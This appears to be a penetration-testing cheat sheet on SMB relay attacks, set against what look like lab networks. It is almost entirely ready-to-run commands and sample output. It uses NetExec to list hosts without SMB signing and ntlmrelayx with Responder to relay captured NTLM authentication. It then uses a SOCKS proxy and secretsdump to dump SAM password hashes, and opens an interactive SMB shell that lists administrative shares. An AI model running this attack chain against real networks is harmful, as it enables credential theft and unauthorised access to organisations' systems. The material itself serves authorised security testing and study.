**SMB Signing Relay Attacks** are an attack method used in network environments where an attacker targets SMB (Server Message Block) communications. It works by intercepting and relaying SMB authentication attempts to another system, allowing the attacker to authenticate as the victim and potentially gain unauthorised access, especially if SMB signing is not enforced.

SMB signing is a security feature that ensures the integrity and authenticity of SMB (Server Message Block) communications by adding a cryptographic signature to each message exchanged between a client and a server, preventing tampering and unauthorised message relay.

### NetExec

Search the network for hosts with SMB signing disabled:

```bash
nxc smb 192.168.56.0/24
```

Create a list of host with SMB signing disabled:

```bash
nxc smb 192.168.56.0/24 --gen-relay-list SMBRelayList.txt
```

Verify list:

```bash
cat SMBRelayList.txt
192.168.56.22
192.168.56.23
```

### Ntlmrelayx

If lucky enough to relay administrative credentials, this will dump the SAM database:

```bash
ntlmrelayx.py -tf SMBRelayList.txt -smb2support
```

Then start Responder in another terminal:

```bash
responder -I vboxnet0
```

### SOCKS Proxy

To interact with a target, use a SOCKS proxy:

```bash
ntlmrelayx.py -tf SMBRelayList.txt -smb2support -socks
```

```bash
ntlmrelayx> socks
Protocol  Target         Username            AdminStatus  Port 
--------  -------------  ------------------  -----------  ----
SMB       192.168.56.22  NORTH/ROBB.STARK    FALSE        445  
SMB       192.168.56.22  NORTH/EDDARD.STARK  TRUE         445  
SMB       192.168.56.23  NORTH/ROBB.STARK    FALSE        445  
SMB       192.168.56.23  NORTH/EDDARD.STARK  FALSE        445
```

Dump SAM:

```bash
proxychains -q secretsdump.py NORTH/EDDARD.STARK:ANYPASS@192.168.56.22
```

### Interactive

Interact with a target, no admin access is required. See what is being shared:

```bash
sudo ntlmrelayx.py -tf LiveIPs.txt -i -smb2support

[*] SMBD-Thread-5 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.160.102 controlled, attacking target smb://10.10.160.101
[*] Authenticating against smb://10.10.160.101 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

Connect to target using NC:

```bash
nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
```